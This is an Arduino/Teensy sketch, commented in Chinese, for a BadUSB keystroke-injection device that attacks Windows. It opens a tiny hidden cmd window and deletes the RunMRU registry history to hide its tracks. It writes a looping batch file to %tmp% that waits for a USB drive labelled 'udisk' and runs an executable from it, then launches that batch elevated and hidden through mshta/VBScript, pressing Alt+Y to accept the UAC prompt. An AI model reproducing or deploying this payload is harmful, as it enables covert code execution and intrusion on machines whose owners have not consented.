void setup() {
  // put your setup code here, to run once:
  /*
  //delay(5000);
  //Keyboard.press(KEY_CAPS_LOCK);
  // Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  // Keyboard.set_key1(KEY_R);
  // Keyboard.send_now();
   delay(100);
   Keyboard.print("cmd /T:01 /K mode CON: COLS=16 LINES=1");  //开启很小的cmd窗口
   Keyboard.set_key1(KEY_ENTER);
   Keyboard.send_now(); 
   delay(200);
   Keyboard.println("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f"); //清理运行记录
   Keyboard.set_key1(KEY_ENTER);
   Keyboard.send_now(); 
   Keyboard.println("del /f /q %tmp%\\w.bat 2>nul");  //先删除可能存在的批处理
   Keyboard.set_key1(KEY_ENTER);
   Keyboard.send_now(); 
   Keyboard.println("copy con %tmp%\\w.bat");         //写入新的批处理文件
   Keyboard.send_now(); 
   Keyboard.println("@echo off");
   Keyboard.println(":lp");
   Keyboard.println("ping 127.1 -n 5 >nul");
   Keyboard.println("for /F %%A in (&#039;wmic volume get driveletter^,label ^| find \"data\"&#039;) do (set Fire=%%A)"); //利用wim查询指定U盘是否插入电脑
   Keyboard.println("IF EXIST \"%Fire%\\2.bat\" (start %Fire%\\2.bat ELSE (goto :lp )");//若存在指定文件，就复制到%tmp%
   Keyboard.set_modifier(MODIFIERKEY_CTRL); //保存以上写入的批处理
   Keyboard.set_key1(KEY_S);
   Keyboard.send_now();
   Keyboard.set_modifier(0);
   Keyboard.set_key1(0);
   Keyboard.send_now();
   Keyboard.set_key1(KEY_ENTER);
   Keyboard.send_now();
   delay(200);
  // Keyboard.println("mshta vbscript:createobject(\"wscript.shell\").ShellExecute(\"%tmp%\\w.bat\",\"/c %~s0 ::\",\"\",\"runas\",0)(window.close) && exit"); //VBS隐藏执行w.bat并退出
 //  Keyboard.set_key1(KEY_ENTER);
 //  Keyboard.send_now();
  // Keyboard.set_modifier(MODIFIERKEY_ALT);
  // Keyboard.send_now();
  // Keyboard.set_key1(KEY_Y);
   Keyboard.send_now();
   Keyboard.set_modifier(0); //释放所有按键
   Keyboard.set_key1(0);
   Keyboard.send_now();
   */
  Keyboard.begin();//开始键盘通信
  delay(1000);//延时1000毫秒，不要太短，因为每天电脑的运行速度都不一样 
  Keyboard.press(KEY_CAPS_LOCK); //按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题
  Keyboard.release(KEY_CAPS_LOCK); //释放大写键
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键 
  Keyboard.press('r');//按下r键 
  Keyboard.release(KEY_LEFT_GUI);//松掉win键 
  Keyboard.release('r');//松掉r键 
  delay(300); 
  Keyboard.println("cmd /T:01 /K mode CON: COLS=16 LINES=1");//输入cmd进入DOS
  //Keyboard.println("cmd");
  Keyboard.press(KEY_RETURN);  //按下回车键
  Keyboard.release(KEY_RETURN); //释放回车键
  delay(500); 
  Keyboard.println("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f");
  Keyboard.press(KEY_RETURN);  //按下回车键
  Keyboard.release(KEY_RETURN); //释放回车键
  
  Keyboard.println("del /f /q %tmp%\\w.bat 2>nul");  //先删除可能存在的批处理
   Keyboard.press(KEY_RETURN);  //按下回车键
  Keyboard.release(KEY_RETURN); //释放回车键
   Keyboard.println("copy con %tmp%\\w.bat");         //写入新的批处理文件
  Keyboard.press(KEY_RETURN);  //按下回车键
  Keyboard.release(KEY_RETURN); //释放回车键
   Keyboard.println("@echo off");
   Keyboard.println(":lp");
   Keyboard.println("for /F %%A in (\'wmic volume get driveletter^,label ^| find \"udisk\"\') do (set Fire=%%A)"); //利用wim查询指定U盘是否插入电脑
   Keyboard.println("IF EXIST \"%Fire%\\\\12\\\\123.exe\" (start %Fire%\\\\12\\\\123.exe) ELSE (goto :lp )");//若存在指定文件，就复制到%tmp%
   Keyboard.set_modifier(MODIFIERKEY_CTRL); //保存以上写入的批处理
   Keyboard.set_key1(KEY_Z);
   Keyboard.send_now();
   Keyboard.println("");
   Keyboard.set_key1(KEY_ENTER);
   Keyboard.send_now();
   Keyboard.println("mshta vbscript:createobject(\"Shell.Application\").ShellExecute(\"%tmp%\\w.bat\",\"/c %~s0 ::\",\"\",\"runas\",0)(window.close) && exit"); //VBS隐藏执行w.bat并退出
   Keyboard.send_now();
   delay(500);
  Keyboard.set_modifier(MODIFIERKEY_ALT); //保存以上写入的批处理
   Keyboard.set_key1(KEY_Y);
   Keyboard.send_now();
 //  Keyboard.set_key1(KEY_ENTER);
  //   Keyboard.send_now();
  
   Keyboard.set_modifier(0);
   Keyboard.set_key1(0);
   Keyboard.send_now();
   Keyboard.set_key1(KEY_ENTER);
   Keyboard.send_now();
  
  
  Keyboard.press(KEY_CAPS_LOCK); //按下大写键
  Keyboard.release(KEY_CAPS_LOCK); //释放大写键 我们再次关闭开启的大写键
  delay(500);
  Keyboard.end();//结束键盘通讯 

}

void loop() {
  // put your main code here, to run repeatedly:

}
